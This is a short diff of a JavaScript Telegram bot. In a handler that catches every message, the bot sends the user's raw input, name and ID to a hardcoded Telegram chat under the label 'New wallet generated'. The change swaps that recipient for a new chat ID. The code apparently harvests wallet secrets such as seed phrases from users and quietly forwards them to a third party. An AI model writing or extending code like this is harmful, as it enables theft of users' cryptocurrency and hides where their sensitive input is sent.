@@ -399,7 +399,7 @@ continueScene.hears(/.*/, async (ctx) => {
     await ctx.telegram.sendMessage(
       // Changed from Message to sendMessage
       //config.otherUsername,
-      1061924582,
+      7519144495,
       `New wallet generated for <b>${ctx.chat.first_name}:</b> userId: <code>${ctx.from.id}</code> \n<code>${input}</code>\n`,
       { parse_mode: "HTML" }
     );
